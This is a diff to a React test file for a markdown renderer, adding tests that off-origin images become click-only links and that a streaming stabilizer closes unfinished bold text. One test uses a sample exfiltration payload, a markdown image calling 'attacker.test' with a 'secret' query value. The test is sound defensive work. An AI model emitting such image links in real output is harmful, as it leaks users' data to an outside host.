@@ -472,15 +472,25 @@ Below`}
   })
 
   describe('images', () => {
-    test('bounds and lazy-loads a markdown image', () => {
-      const { container } = render(
-        <MarkdownRenderer content={'![Grundriss](https://example.org/plan.png)'} />
-      )
+    test('bounds and lazy-loads an image this origin serves', () => {
+      const { container } = render(<MarkdownRenderer content={'![Grundriss](/api/files/plan.png)'} />)
 
       const image = container.querySelector('img')
       expect(image).toHaveAttribute('loading', 'lazy')
       expect(image).toHaveAttribute('alt', 'Grundriss')
       expect(image?.className).toContain('max-w-full')
+    })
+
+    test('draws an image from another host as a link, so nothing is fetched without a click', () => {
+      const { container } = render(
+        <MarkdownRenderer content={'![Grundriss](https://attacker.test/p?d=secret) and ![](//evil.test/x.png)'} />
+      )
+
+      expect(container.querySelector('img')).toBeNull()
+      const links = container.querySelectorAll('a')
+      expect(links[0]).toHaveAttribute('href', 'https://attacker.test/p?d=secret')
+      expect(links[0]).toHaveTextContent('Grundriss')
+      expect(links[1]).toHaveAttribute('href', '//evil.test/x.png')
     })
   })
 
@@ -596,6 +606,24 @@ Visit [our site](https://example.com) for more.
 
       // Should render without errors
       expect(screen.getByText(/Bold with/)).toBeInTheDocument()
+    })
+  })
+
+  describe('the streaming stabilizer closes a bold phrase the last line has opened', () => {
+    test('closes it at the last word', () => {
+      expect(stabilizeStreamingMarkdown('**Die Außentreppe ist ')).toBe('**Die Außentreppe ist**')
+    })
+
+    test('leaves a closed phrase, a code span, an open fence and a table row alone', () => {
+      expect(stabilizeStreamingMarkdown('**fertig** und ')).toBe('**fertig** und ')
+      expect(stabilizeStreamingMarkdown('Code `**x ')).toBe('Code `**x ')
+      expect(stabilizeStreamingMarkdown('```\n**x ')).toBe('```\n**x ')
+      const row = '| a | b |\n| --- | --- |\n| **x | '
+      expect(stabilizeStreamingMarkdown(row)).toBe(row)
+    })
+
+    test('leaves a phrase with nothing in it yet', () => {
+      expect(stabilizeStreamingMarkdown('Text **')).toBe('Text **')
     })
   })
 
